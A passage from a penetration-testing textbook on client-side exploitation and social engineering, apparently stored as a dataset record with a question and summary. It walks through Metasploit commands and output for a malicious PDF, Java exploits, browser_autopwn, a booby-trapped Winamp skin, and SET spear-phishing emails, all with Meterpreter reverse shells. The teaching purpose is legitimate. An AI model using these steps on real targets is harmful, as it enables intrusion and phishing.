exploit(adobe_pdf_embedded_exe) > set INFILENAME /usr/share/set/readme/User_Manual.pdfu\nINFILENAME => /usr/share/set/readme/User_Manual.pdf\nmsf exploit(adobe_pdf_embedded_exe) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(adobe_pdf_embedded_exe) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(adobe_pdf_embedded_exe) > exploit\n[*] Reading in '/usr/share/set/readme/User_Manual.pdf'... [*] Parsing '/usr/share/set/readme/User_Manual.pdf'... [*] Using 'windows/meterpreter/reverse_tcp' as payload... [*] Parsing Successful. Creating 'evil.pdf' file... [+] evil.pdf stored at /root/.msf4/local/evil.pdfv\nListing 10-14: Setting module options and creating the malicious PDF\nWe’ll use a PDF included with Kali Linux for our example: the Metasploit\nuser guide at /user/share/set/readme/User_Manual.pdf u. The generated PDF is\nagain stored in the /root/msf4/local/ directory v. (Be sure to set up a handler\nfor the payload with the multi/handler module before opening the PDF on\nthe Windows XP target. For a refresher, see Listing 10-11.)\nnote The previous exploit may have left Adobe Reader in a bad state, so you may need to\nrestart Windows XP to get it to properly load the new PDF. When the malicious PDF is opened, the user sees a warning like the one\nshown in Figure 10-1. The user must click Open for the embedded executable\nto run. This attack depends on users being willing to click through this warning. Figure 10-1: PDF embedded executable user warning\nClient-Side Exploitation 229\nOnce you click Open in the PDF warning, the payload will run, and you\nwill receive a session. Java Exploits\nJava vulnerabilities are a prevalent client-side attack vector. In fact, some\nexperts suggest that in light of the security issues that plague Java, users\nshould uninstall or disable the software in their browsers. One thing that makes Java attacks so powerful is that one exploit can\ngain access to multiple platforms. Windows, Mac, and even Linux systems\nrunning the Java Runtime Environment (JRE) in a browser can all be\nexploited by exactly the same exploit when that browser opens a malicious\npage. Here are some sample exploits. Java Vulnerability\nAs exhibit number one, we’ll use the Metasploit module exploit/multi/browser/\njava_jre17_jmxbean, as shown in Listing 10-15. Use of this module is similar\nto that of the Internet Explorer Aurora exploit shown earlier in this chap-\nter. Metasploit sets up a malicious server to exploit this cross-platform vul-\nnerability on any browser that arrives at the page. Any browser running Java\nversion 7 before update 11 is affected. msf > use exploit/multi/browser/java_jre17_jmxbean\nmsf exploit(java_jre17_jmxbean) > show options\nModule options (exploit/multi/browser/java_jre17_jmxbean):\nName Current Setting Required Description\n---- --------------- -------- -----------\nSRVHOST 0.0.0.0 yes The local host to listen on. This must be an address\non the local machine or 0.0.0.0\nSRVPORT 8080 yes The local port to listen on. --snip--\nURIPATH no The URI to use for this exploit (default is random)\nExploit target:\nId Name\n-- ----\n0 Generic (Java Payload)\nmsf exploit(java_jre17_jmxbean) > set SRVHOST 192.168.20.9\nSRVHOST => 10.0.1.9\nmsf exploit(java_jre17_jmxbean) > set SRVPORT 80\nSRVPORT => 80\nmsf exploit(java_jre17_jmxbean) > set URIPATH javaexploit\nURIPATH => javaexploit\nmsf exploit(java_jre17_jmxbean) > show payloadsu\n230 Chapter 10\nCompatible Payloads\n===================\nName Disclosure Date Rank Description\n---- --------------- ---- -----------\n--snip--\njava/meterpreter/bind_tcp normal Java Meterpreter, Java Bind TCP\nStager\njava/meterpreter/reverse_http normal Java Meterpreter, Java Reverse HTTP\nStager\njava/meterpreter/reverse_https normal Java Meterpreter, Java Reverse\nHTTPS Stager\njava/meterpreter/reverse_tcp normal Java Meterpreter, Java Reverse TCP\nStager\njava/shell_reverse_tcp normal Java Command Shell, Reverse TCP\nInline\n--snip--\nmsf exploit(java_jre17_jmxbean) > set payload java/meterpreter/reverse_httpv\npayload => java/meterpreter/reverse_http\nListing 10-15: Setting up a Java exploit\nSet the options to match your environment. Set the SRVHOST option\nto the local IP address, and change the SRVPORT, if you would like. Set the\nURIPATH to something that will be easy to type in your target browser. Notice that because this exploit is multi-platform and the code execu-\ntion takes place entirely inside the JRE, our payload options are Java-based. The usual suspects are all here, from staged payloads, inline payloads, bind\nshells, reverse shells, Meterpreter, and so on, as shown in the list of payloads\nat u. We’ll use the payload java/meterpreter/reverse_http, which uses legitimate\nHTTP traffic v. Its options are shown in Listing 10-16. msf exploit(java_jre17_jmxbean) > show options\nModule options (exploit/multi/browser/java_jre17_jmxbean):\n--snip--\nPayload options (java/meterpreter/reverse_http):\nName Current Setting Required Description\n---- --------------- -------- -----------\nLHOST yes The local listener hostname\nLPORT 8080 yes The local listener port\nExploit target:\nId Name\n-- ----\n0 Generic (Java Payload)\nClient-Side Exploitation 231\nmsf exploit(java_jre17_jmxbean) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(java_jre17_jmxbean) > exploit\n[*] Exploit running as background job. [*] Started HTTP reverse handler on http://192.168.20.9:8080/\n[*] Using URL: http://192.168.20.9:80/javaexploit\n[*] Server started. msf exploit(java_jre17_jmxbean) > [*] 192.168.20.12 java_jre17_jmxbean - handling\nrequest for /javaexploit\n[*] 192.168.20.12 java_jre17_jmxbean - handling request for /javaexploit/\n[*] 192.168.20.12 java_jre17_jmxbean - handling request for /javaexploit/hGPonLVc.jar\n[*] 192.168.20.12 java_jre17_jmxbean - handling request for /javaexploit/hGPonLVc.jar\n[*] 192.168.20.12:49188 Request received for /INITJM... [*] Meterpreter session 1 opened (192.168.20.9:8080 -> 192.168.20.12:49188) at 2015-05-05\n19:15:19 -0400\nListing 10-16: Exploiting a Java vulnerability with an HTTP payload\nThese options should look familiar. The default LPORT option is now\n8080 instead of 4444. Notice that both SRVPORT and LPORT default to 8080,\nso we’ll need to change at least one of them. After you’ve finished setting options, start the exploit server and browse\nto the malicious page from your Windows 7 target. Either Internet Explorer\nor Mozilla Firefox will fall victim to this attack as long as you have enabled\nthe vulnerable Java browser plugin. One of the great features of the HTTP and HTTPS Meterpreter pay-\nloads, aside from being legitimate HTTP and HTTPS traffic and thus\nby passing even some traffic-inspecting filters, is their ability to reattach to\na dropped session. (Network problems can cause sessions to spontaneously\ndie—a big annoyance for pentesters.) We’ll examine other ways to gain\npersistent access in Chapter 13, but for now let’s detach our Meterpreter\nsession, as shown in Listing 10-17. msf exploit(java_jre17_jmxbean) > sessions -i 1\n[*] Starting interaction with 1... meterpreter > detach\n[*] 10.0.1.16 - Meterpreter session 1 closed. Reason: User exit\nmsf exploit(java_jre17_jmxbean) >\n[*] 192.168.20.12:49204 Request received for /WzZ7_vgHcXA6kWjDi4koK/... [*] Incoming orphaned session WzZ7_vgHcXA6kWjDi4koK, reattaching... [*] Meterpreter session 2 opened (192.168.20.9:8080 -> 192.168.20.12:49204) at\n2015-05-05 19:15:45 -0400 u\nListing 10-17: Detaching the HTTP Meterpreter session\nAs you can see, the handler for the HTTP Meterpreter payload is still\nrunning in the background. Wait a few seconds, and you should see a new\nsession open without the user needing to revisit the attack page as shown\nat u. Unless the session has been formally exited, the payload will continue\n232 Chapter 10\nto try to connect back to Metasploit. (You can specify how long the ses-\nsion tries to reconnect with the SessionCommunicationTimeOut parameter, an\nadvanced option for the payload.)\nBut what if your pentest target is diligent in updating Java, and there\nare currently no zero-days for the software floating around the Internet? Signed Java applet\nMuch like the attack against PDF users discussed in “PDF Embedded\nExecutable” on page 228, we can bypass the need for an unpatched Java\nvulnerability by simply asking users to allow us to run malicious code. You’ve probably seen browser warnings like, “This site would like to run\nthis thing in your browser, how would you like to proceed?” Sometimes\neven security-savvy users can be convinced to just say “Yes” and bypass this\nwarning without further investigation if they can be convinced that what’s\non the other side is useful. The module we’ll use for this example is exploit/multi/browser/java_\nsigned_applet. As the name implies, this module will create a malicious Java\napplet, as shown in Listing 10-18. msf exploit(java_jre17_jmxbean) > use exploit/multi/browser/java_signed_applet\nmsf exploit(java_signed_applet) > show options\nModule options (exploit/multi/browser/java_signed_applet):\nName Current Setting Required Description\n---- --------------- -------- -----------\nAPPLETNAME SiteLoader yes The main applet's class name. uCERTCN SiteLoader yes The CN= value for the certificate. Cannot contain\n',' or '/'\nSRVHOST 0.0.0.0 yes The local host to listen on.\n\nThis must be an\naddress on the local machine or 0.0.0.0\nSRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections\nSSLCert no Path to a custom SSL certificate (default is\nrandomly generated)\nSSLVersion SSL3 no Specify the version of SSL that should be used\n(accepted: SSL2, SSL3, TLS1)\nvSigningCert no Path to a signing certificate in PEM or PKCS12\n(.pfx) format\nSigningKey no Path to a signing key in PEM format\nSigningKeyPass no Password for signing key (required if SigningCert\nis a .pfx)\nURIPATH no The URI to use for this exploit (default is\nrandom)\nExploit target:\nId Name\n-- ----\nw1 Windows x86 (Native Payload)\nClient-Side Exploitation 233\nmsf exploit(java_signed_applet) > set APPLETNAME BulbSec\nAPPLETNAME => Bulb Security\nmsf exploit(java_signed_applet) > set SRVHOST 192.168.20.9\nSRVHOST => 192.168.20.9\nmsf exploit(java_signed_applet) > set SRVPORT 80\nSRVPORT => 80\nListing 10-18: Metasploit signed Java applet module\nOlder versions of Java will allow us to use the CERTCN option shown at u to\nsay that the applet is signed by any entity that we choose. Newer versions of\nJava, like the one installed on the Windows 7 target, will say that the signer\nis unknown unless we sign the applet with a trusted signing certificate,\nwhich we can specify at v. If this option is set, it will override the CERTCN\noption. If we have a trusted signing certificate or we’ve compromised a cer-\ntificate from our target, we can make our applet look more legitimate, but\nwe’ll leave our applet self-signed for this example. As shown at w, the default target for this module is a Windows system. However, as shown in Listing 10-19, we can use payloads for other platforms\nrunning JRE. msf exploit(java_signed_applet) > show targets\nExploit targets:\nId Name\n-- ----\nu0 Generic (Java Payload)\n1 Windows x86 (Native Payload)\n2 Linux x86 (Native Payload)\n3 Mac OS X PPC (Native Payload)\n4 Mac OS X x86 (Native Payload)\nmsf exploit(java_signed_applet) > set target 0\ntarget => 0\nmsf exploit(java_signed_applet) > set payload java/meterpreter/reverse_tcp\npayload => java/meterpreter/reverse_tcp\nmsf exploit(java_signed_applet) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(java_signed_applet) > exploit\n[*] Exploit running as background job. [*] Started reverse handler on 192.168.20.9:4444\n[*] Using URL: http://192.168.20.9:80/Dgrz12PY\n[*] Server started. Listing 10-19: Using a Java payload\n234 Chapter 10\nAs with other Java exploits, we can make this attack multi-platform. We\ncan change the target to Linux or Mac OS, or use a Java payload u that\nwill target them all. note As with our PDF examples, the previous exploit has left Java in a bad state, and you\nmay need to restart Windows 7 before attempting to run the applet. Browse to the Metasploit server from your Windows 7 target, and you\nshould be prompted to run the applet, as shown in Figure 10-2. The secu-\nrity warning informs you that if this applet is malicious, it will have access\nto the system and lets you know you should run the application only if\nthe publisher is trusted. Because we didn’t use a signing certificate that is\ntrusted by the browser certificate chain, the warning says in big letters that\nthe publisher is unknown. This should stop anyone from running the mali-\ncious applet, right? Figure 10-2: Java applet attack\nDespite the warnings, the Social-Engineer Toolkit (which we’ll explore\nin the next chapter) claims that this attack is one of the most successful of\nthe many available, even though it doesn’t rely on any unpatched vulner-\nability in Java or the underlying operating system. browser_autopwn\nThe browser_autopwn module is another client-side exploitation option\navailable in Metasploit. Although it’s sometimes considered cheating, this\nmodule loads all the browser and browser add-on modules that it knows\nClient-Side Exploitation 235\nof (including Java, Flash, and so on) and waits for a browser to connect to\nthe server. Once the browser connects, the server fingerprints the browser\nand serves up all the exploits it thinks are likely to succeed. An example is\nshown in Listing 10-20. msf > use auxiliary/server/browser_autopwn\nmsf auxiliary(browser_autopwn) > show options\nModule options (auxiliary/server/browser_autopwn):\nName Current Setting Required Description\n---- --------------- -------- -----------\nLHOST yes The IP address to use for reverse-connect payloads\nSRVHOST 0.0.0.0 yes The local host to listen on. This must be an address\non the local machine or 0.0.0.0\nSRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections\nSSLCert no Path to a custom SSL certificate (default is randomly\ngenerated)\nSSLVersion SSL3 no Specify the version of SSL that should be used\n(accepted: SSL2, SSL3, TLS1)\nURIPATH no The URI to use for this exploit (default is random)\nmsf auxiliary(browser_autopwn) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf auxiliary(browser_autopwn) > set URIPATH autopwn\nURIPATH => autopwn\nmsf auxiliary(browser_autopwn) > exploit\n[*] Auxiliary module execution completed\n[*] Setup\nmsf auxiliary(browser_autopwn) >\n[*] Obfuscating initial javascript 2015-03-25 12:55:22 -0400\n[*] Done in 1.051220065 seconds\n[*] Starting exploit modules on host 192.168.20.9... --snip--\n[*] --- Done, found 16 exploit modules\n[*] Using URL: http://0.0.0.0:8080/autopwn\n[*] Local IP: http://192.168.20.9:8080/autopwn\n[*] Server started. Listing 10-20: Starting browser_autopwn\nOur options for this module are the usual client-side attacks. As shown\nhere, I’ve set the LHOST for my shells to call back to Kali’s IP address, and\nURIPATH to something easy to remember (autopwn). Note that we don’t need\nto set any payloads here; as the individual modules are loaded, Metasploit\nsets the payload options appropriately. 236 Chapter 10\nWith the server started, browse to the malicious page from a web\nbrowser. I used Internet Explorer on my Windows 7 target as shown in\nListing 10-21. [*] 192.168.20.12 browser_autopwn - Handling '/autopwn'\n[*] 192.168.20.12 browser_autopwn - Handling '/autopwn?sessid=TWljcm9zb2Z0IFdpbmRvd3M6NzpTUDE6\nZW4tdXM6eDg2Ok1TSUU6OC4wOg%3d%3d'\n[*] 192.168.20.12 browser_autopwn - JavaScript Report: Microsoft Windows:7:SP1:en-us:x86:\nMSIE:8.0: u\n[*] 192.168.20.12 browser_autopwn - Responding with 14 exploits v\n[*] 192.168.20.12 java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation\nVulnerability\n--snip--\nmsf auxiliary(browser_autopwn) > sessions -l\nActive sessions\n===============\nId Type Information Connection\n-- ---- ----------- ----------\n1 meterpreter java/java Georgia Weidman @ BookWin7 192.168.20.9:7777 ->\n\n192.168.20.12:49195 (192.168.20.12)\n2 meterpreter java/java Georgia Weidman @ BookWin7 192.168.20.9:7777 ->\n\n192.168.20.12:49202 (192.168.20.12)\n3 meterpreter java/java Georgia Weidman @ BookWin7 192.168.20.9:7777 ->\n\n192.168.20.12:49206 (192.168.20.12)\n4 meterpreter java/java Georgia Weidman @ BookWin7 192.168.20.9:7777 ->\n\n192.168.20.12:49209 (192.168.20.12)\nListing 10-21: Autopwning a browser\nAs you can see Metasploit notices my browser and attempts to detect\nits version and running software u. It then sends all the exploits it thinks\nmight be effective v. Once all is said and done, run sessions -l to see how things turned out. In my case, I received four new sessions. Not bad for so little work. As you\nmight expect though, all of those exploits overwhelmed the browser and it\ncrashed. (Luckily, all of our sessions were automatically migrated.)\nThough browser_autopwn is not nearly as stealthy or elegant as perform-\ning reconnaissance and then choosing a particular exploit likely to work\nagainst a target, it can be a real help in a pinch, which is why it’s worth hav-\ning in your pentesting arsenal. Winamp\nSo far our client-side attacks have basically followed the same pattern. We\ngenerate a malicious file that exploits a vulnerability in the client software\nor prompts the user for permission to run malicious code. The user opens\nthe file with the relevant program, and we get a session in Metasploit. Now\nfor something a bit different. Client-Side Exploitation 237\nIn this example, we trick the user into replacing a configuration file\nfor the Winamp music player program. When the user next opens the pro-\ngram, the evil configuration file will be processed regardless of which music\nfile the user opens. The Metasploit module we’ll use is exploit/windows/\nfileformat/winamp_maki_bof, which exploits a buffer overflow issue in\nWinamp version 5.55. As you can see with show options in Listing 10-22, this module has no\noptions to set; all we need is a Windows payload. The module generates a\nmalicious Maki file for use with Winamp skins. As with our PDF examples,\nit’s up to us to serve the file and set up a handler for the payload. msf > use exploit/windows/fileformat/winamp_maki_bof\nmsf exploit(winamp_maki_bof) > show options\nModule options (exploit/windows/fileformat/winamp_maki_bof):\nName Current Setting Required Description\n---- --------------- -------- -----------\nExploit target:\nId Name\n-- ----\n0 Winamp 5.55 / Windows XP SP3 / Windows 7 SP1\nmsf exploit(winamp_maki_bof) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(winamp_maki_bof) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(winamp_maki_bof) > exploit\n[*] Creating 'mcvcore.maki' file ... [+] mcvcore.maki stored at /root/.msf4/local/mcvcore.maki\nListing 10-22: Metasploit Winamp exploit\nChoose a compatible Windows payload as shown. Once the malicious\nMaki file has been generated, copy it to the Apache web server directory, and\nset up a payload handler. (An example of setting up the handler is included\nin Listing 10-11 on page 227.) Now we need to package this malicious file in\nsuch a way that a user may be convinced to load it in Winamp. We can create\na new Winamp skin by copying one of the skins packaged with Winamp. We\ncan replace the mcvcore.maki file from our example skin with our malicious\none. It doesn’t matter what our skin actually looks like, because it will cause\nWinamp to hang and send us our session in Metasploit. 238 Chapter 10\nIn Windows 7, make a copy of the default Bento Winamp skin folder\nfrom C:\\Program Files\\Winamp\\Skins and copy it to Kali. Rename the folder\nBento to Rocketship. Replace the file Rocketship\\scripts\\mcvcore.maki with the\nmalicious file we just created in Metasploit. Zip the folder and copy it to\nthe web server. In the next chapter we will look at methods of creating\nbelievable social-engineering campaigns, but suffice it to say, if we can\nconvince users that this malicious skin will make their Winamp look like\na rocket ship, we might be able to convince users to install it. Switch to Windows 7, download the zipped skin from the Kali web\nserver, unzip it, and save the folder to C:\\Program Files\\Winamp\\Skins as\nshown in Figure 10-3. Figure 10-3: Installing the malicious Winamp skin\nNow open Winamp, go to Options4Skins, and choose Rocketship, as\nshown in Figure 10-4. Once you select the malicious skin, Winamp will appear to close, and\nyou will receive a session in your Metasploit handler. Client-Side Exploitation 239\nFigure 10-4: Using the malicious skin\nsummary\nThe attacks we’ve seen in this chapter target software that is not listening\non a network port. We attacked browsers, PDF viewers, the Java browser\nplugin, and a music player. We generated malicious files that trigger a\nvulnerability in the client-side software when opened by the user, and we\nlooked at examples that ask the user for permission to run malicious code\ninstead of relying on an unpatched vulnerability. The Internet can be a scary place for client-side software. Some of the\nexploits discussed in this chapter were seen in the wild before a patch was\nissued by the vendors. In fact, the Java exploit we used in “Java Vulnerability”\non page 230 was still a zero-day vulnerability when the Metasploit module\nwas added to the framework. Anyone using Java 7 could run afoul of a mali-\ncious site, even if his or her machine was fully patched, and all an attacker\nhad to do was use Metasploit to perform a successful attack. Of course, disabling or uninstalling Java fixes this problem in the event\nof a zero-day exploit running rampant on the Internet, but that might not\nbe feasible for all users and organizations. Though not all sites use Java,\npopular online meeting software such as WebEx and GoToMeeting require\nJava, and the virtual classroom software Blackboard has Java components as\n240 Chapter 10\nwell. A lot of network/security appliances actually require network/security\nadmins to run outdated versions of Java, which makes them perfect tar-\ngets for client-side attacks. Most readers can probably think of at least one\nsite that complains if Java is not installed. Client-side software is necessary to perform day-to-day tasks in any\norganization, but this software should not be overlooked when evaluat-\ning security risks. Keeping all client-side software up-to-date with the lat-\nest patches can be a daunting task on your personal computer, much less\non the computers of an entire organization. Even organizations that are\ndoing a good job of applying important Windows security fixes may miss\nan update to Java or Adobe Reader and leave company workstations open to\nclient-side attacks. All of the attacks in this chapter depend on a legitimate user taking\naction on the target systems. Although we’ve seen what can happen when\nusers are tricked into opening malicious files, we’ve yet to look at the\ntricks used to make people open those files. In the next chapter we’ll study\nsocial engineering—that is, ways of tricking users into performing harm-\nful actions such as opening a malicious file, entering credentials into an\nattacker-owned site, or giving out sensitive information over the phone. Client-Side Exploitation 241\n11\nsoCial engineering\nIt is a common saying in information security that\nusers are the vulnerability that can never be patched. Put all the security controls in place that you want,\nbut if an employee can be convinced to give up sensi-\ntive company information, it is all for naught. In fact,\nmany of the most famous hacks include no system\nexploitation at all. For example, consider notorious hacker Kevin Mitnick. Many of Mitnick’s\nmost famous exploits came down to walking into a building, convincing\nthe security guard he had permission to be there, and then walking out\nwith what he wanted. This kind of attack, called social engineering, exploits\nhuman vulnerabilities: a desire to be helpful, unawareness of security poli-\ncies, and so on. Social-engineering attacks can involve complex technical requirements\nor no technology at all. A social engineer can buy a cable guy uniform at\nthe thrift store and potentially walk into an organization, and even into the\nserver room. The IT help desk can receive a frantic call from the boss’s\nboss’s assistant, who claims to have locked himself out of his webmail\naccount. People generally want to be helpful, so unless there is a secure\npolicy in place, the help desk worker may read back the password over the\nphone or set it to a default value, even though the caller is not who he says\nhe is. A common vector for social-engineering attacks is email. If you are ever\nshort on entertainment at work, check out your email spam folder. Among\nthe advertisements to make some things bigger and others smaller, you will\nfind people trying desperately to give you all their money. I firmly believe\nthat if you can find the one African prince who really does want to give you\nhis fortune, it will be worth all those times your bank account got hacked\nfrom answering phishing emails. Joking aside, attempting to trick a user\ninto giving up sensitive information by posing as a trusted person via email\nor other electronic means is known as a phishing attack. Phishing emails can\nbe used to lure targets to visit malicious sites or download malicious attach-\nments, among other things. Social-engineering attacks are the missing\nelement needed to trick users into falling victim to the client-side attacks we\nstudied in Chapter 10. Companies should put time and effort into training all employees\nabout social-engineering attacks. No matter what sort of security technolo-\ngies you put in place, employees have to be able to use their workstations,\ntheir mobile devices, and so on to get their job done. They will have access\nto sensitive information or security controls that, in the wrong hands, could\nharm the organization. Some security-awareness training may seem obvi-\nous, like “Don’t share your password with anyone” and “Check someone’s\nbadge before you hold the door to a secure area for him or her.” Other\nsecurity awareness may be new to many employees. For instance, on some\npentesting engagements, I’ve had great success leaving USB sticks in the\nparking lot or DVDs labeled “Payroll” on the bathroom floor. Curious users\nstart plugging these in, opening files, and giving me access to their systems. Security-awareness training about malicious files, USB switchblades, and\nother attacks can help stop users from falling victim to these types of social-\nengineering attacks. the social-engineer toolkit\nTrustedSec’s Social-Engineer Toolkit (SET), an open source Python-driven\ntool, is designed to help you perform social-engineering attacks during pen-\ntests. SET will help you create a variety of attacks such as email phishing\ncampaigns (designed to steal credentials, financial information, and so on\nusing specially targeted email) and web-based attacks (such as cloning a\nclient website and tricking users into entering their login credentials). 244 Chapter 11\nSET comes preinstalled in Kali Linux. To start SET in Kali Linux,\nenter setoolkit at a prompt, as shown in Listing 11-1. We’ll use SET to run\nsocial-engineering attacks, so enter a 1 at the prompt to move to the Social-\nEngineering Attacks menu. You will be prompted to accept the terms of\nservice. root@kali:~# setoolkit\n--snip--\nSelect from the menu:\n1) Social-Engineering Attacks\n2) Fast-Track Penetration Testing\n3) Third Party Modules\n--snip--\n99) Exit the Social-Engineer Toolkit\nset> 1\nListing 11-1: Starting SET\nIn this chapter we’ll look at just a few of the SET attacks that I use regu-\nlarly on pentesting engagements. We’ll begin with spear-phishing attacks,\nwhich allow us to deliver attacks via email. spear-Phishing attacks\nThe Social-Engineering Attacks menu gives us several attack options, as\nshown in Listing 11-2. We’ll create a spear-phishing attack, which will allow\nus to create malicious files for client-side attacks (like the ones covered in\nChapter 10), email them, and automatically set up a Metasploit handler to\ncatch the payload. Select from the menu:\n1) Spear-Phishing Attack Vectors u\n2) Website Attack Vectors\n3) Infectious Media Generator\n4) Create a Payload and Listener\n5) Mass Mailer Attack\n--snip--\n99) Return back to the main menu. set> 1\nListing 11-2: Choose Spear-Phishing Attack Vectors\nSelect option 1 to choose Spear-Phishing Attack Vectors u. The Spear-\nPhishing Attack Vectors menu is shown in Listing 11-3.",
    "question": "What are some examples of client-side exploitation techniques and how do they differ from server-side vulnerabilities in the context of penetration testing?",
    "summary": "This chapter discusses client-side exploitation techniques that target software not listening on network ports, such as browsers, PDF viewers, Java, and Winamp. It explains how attackers can generate malicious files or use embedded code to exploit vulnerabilities or trick users into running harmful code. The chapter also covers how to keep sessions alive after the exploited process crashes and highlights the importance of keeping client-side software up to date. Finally, it introduces the Social-Engineer Toolkit (SET) as a tool for conducting social engineering attacks, including spear-phishing, to trick users into compromising their systems."
  },
  {
    "start": 74,
    "end": 79,
    "text": "1) Perform a Mass Email Attack u\n2) Create a FileFormat Payload v\n3) Create a Social-Engineering Template w\nSocial Engineering 245\n--snip--\n99) Return to Main Menu\nset:phishing> 1\nListing 11-3: Choose Perform a Mass Email Attack\nThe first option, Perform a Mass Email Attack u, allows us to send a mali-\ncious file to a predefined email address or list of addresses as well as set up\na Metasploit listener for the selected payload. The second option, Create a\nFileFormat Payload v, lets us create a malicious file with a Metasploit payload. The third option allows us to create a new email template w to be used in\nSET attacks. Choose option 1 to create an email attack. (We’ll have the option to\nsend a single email or mass email later.)\nChoosing a Payload\nNow to choose a payload. A selection of payload options is shown in\nListing 11-4. ********** PAYLOADS **********\n1) SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)\n--snip--\n12) Adobe util.printf() Buffer Overflow u\n--snip--\n20) MSCOMCTL ActiveX Buffer Overflow (ms12-027)\nset:payloads> 12\nListing 11-4: Choose a spear-phishing attack\nFor example, to re-create our PDF attack from Chapter 10, choose\noption 12: Adobe util.printf() Buffer Overflow u. (SET includes many\nMetasploit attacks, as well as its own, specific attacks.)\nYou should be prompted to choose a payload for your malicious file\n(see Listing 11-5). 1) Windows Reverse TCP Shell Spawn a command shell on victim and\nsend back to attacker\n2) Windows Meterpreter Reverse_TCP Spawn a meterpreter shell on victim\nand send back to attacker u\n--snip--\nset:payloads> 2\nListing 11-5: Choose a payload\n246 Chapter 11\nThe usual suspects are all here, including windows/meterpreter/reverse_tcp,\nwhich appears in a more human-readable form as Windows Meterpreter Reverse_\nTCP u. We’ll choose this option for our sample attack. Setting Options\nSET should prompt for the relevant options for the payload, in this case the\nLHOST and LPORT. If you’re not very familiar with Metasploit, just answer the\nprompts to set the correct options automatically, as shown in Listing 11-6. Set the payload listener to the IP address of Kali Linux. Leave the port to\nconnect back on to the default (443). set> IP address for the payload listener: 192.168.20.9\nset:payloads> Port to connect back on [443]:\n[-] Defaulting to port 443... [-] Generating fileformat exploit... [*] Payload creation complete. [*] All payloads get sent to the /usr/share/set/src/program_junk/template.pdf\ndirectory\n[-] As an added bonus, use the file-format creator in SET to create your\nattachment. Listing 11-6: Setting options\nNaming Your File\nNext you should be prompted to name your malicious file. Right now the attachment will be imported with filename of 'template.whatever'\nDo you want to rename the file? example Enter the new filename: moo.pdf\n1. Keep the filename, I don't care. 2. Rename the file, I want to be cool. u\nset:phishing> 2\nset:phishing> New filename: bulbsecuritysalaries.pdf\n[*] Filename changed, moving on... Select option 2 u to rename the malicious PDF, and enter the filename\nbulbsecuritysalaries.pdf. SET should continue. Single or Mass Email\nNow to decide whether to have SET send our malicious file to a single email\naddress or a list of addresses, as shown in Listing 11-7. Social Engineering 247\nSocial Engineer Toolkit Mass E-Mailer\nWhat do you want to do:\n1. E-Mail Attack Single Email Address u\n2. E-Mail Attack Mass Mailer v\n99. Return to main menu. set:phishing> 1\nListing 11-7: Choosing to perform a single email address attack\nChoose the single email address option u for now. (We’ll look at send-\ning mass email v in “Mass Email Attacks” on page 253.)\nCreating the Template\nWhen crafting the email, we can use one of SET’s email templates or enter\ntext for one-time use in the template. In addition, if you choose Create a\nSocial-Engineering Template, you can create a template that you can reuse. Many of my social engineering customers like me to use fake emails\nthat appear to come from a company executive or the IT manager, announc-\ning new website functionality or a new company policy. Let’s use one of\nSET’s email templates as an example to fake this email now, as shown in\nListing 11-8; we’ll create our own email later in the chapter. Do you want to use a predefined template or craft a one time email\ntemplate. 1. Pre-Defined Template\n2. One-Time Use Email Template\nset:phishing> 1\n[-] Available templates:\n1: Strange internet usage from your computer\n2: Computer Issue\n3: New Update\n4: How long has it been\n5: WOAAAA!!!!!!!!!! This is crazy... 6: Have you seen this? 7: Dan Brown's Angels & Demons\n8: Order Confirmation\n9: Baby Pics\n10: Status Report\nset:phishing> 5\nListing 11-8: Choosing an email template\nChoose 1 for Pre-Defined Template, then choose template 5. Setting the Target\nNow SET should prompt you for your target email address and a mail server\nfor use in delivering the attack email. You can use your own mail server, one\n248 Chapter 11\nthat is misconfigured to allow anyone to send mail (called an open relay),\nor a Gmail account, as shown in Listing 11-9. Let’s use Gmail for this attack\nby choosing option 1. set:phishing> Send email to: georgia@metasploit.com\n1. Use a gmail Account for your email attack. 2. Use your own server or open relay\nset:phishing> 1\nset:phishing> Your gmail email address: georgia@bulbsecurity.com\nset:phishing> The FROM NAME user will see: Georgia Weidman\nEmail password:\nset:phishing> Flag this message/s as high priority? [yes|no]: no\n[!] Unable to deliver email. Printing exceptions message below, this is most\nlikely due to an illegal attachment. If using GMAIL they inspect PDFs and is\nmost likely getting caught. u\n[*] SET has finished delivering the emails\nListing 11-9: Sending email with SET\nWhen prompted, enter the email address and password for your Gmail\naccount. SET should attempt to deliver the message. But as you can see in\nthe message at the bottom of the listing, Gmail inspects attachments and\ncatches our attack u. That’s just a first attempt, of course. You may get better results using\nyour own mail server or your client’s mail server, if you can gather or guess\nthe credentials. Of course, in this example, I’m just sending emails to myself. We\nlooked at tools such as theHarvester to find valid email addresses to target\nin Chapter 5. Setting Up a Listener\nWe can also have SET set up a Metasploit listener to catch our payload\nif anyone opens the email attachment. Even if you’re not familiar with\nMetasploit syntax, you should be able to use SET to set up this attack based\non the options we chose in “Setting Options” on page 247. You can see\nthat SET uses a resource file to automatically set the payload, LHOST, and\nLPORT options based on our previous answers when building the payload\n(see Listing 11-10). set:phishing> Setup a listener [yes|no]: yes\nEasy phishing: Set up email templates, landing pages and listeners\nin Metasploit Pro's wizard -- type 'go_pro' to launch it now. =[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]\n+ -- --=[ 1246 exploits - 678 auxiliary - 198 post\n+ -- --=[ 324 payloads - 32 encoders - 8 nops\n[*] Processing src/program_junk/meta_config for ERB directives. resource (src/program_junk/meta_config)> use exploit/multi/handler\nSocial Engineering 249\nresource (src/program_junk/meta_config)> set PAYLOAD windows/meterpreter/\nreverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nresource (src/program_junk/meta_config)> set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nresource (src/program_junk/meta_config)> set LPORT 443\nLPORT => 443\n--snip--\nresource (src/program_junk/meta_config)> exploit -j\n[*] Exploit running as background job. msf exploit(handler) >\n[*] Started reverse handler on 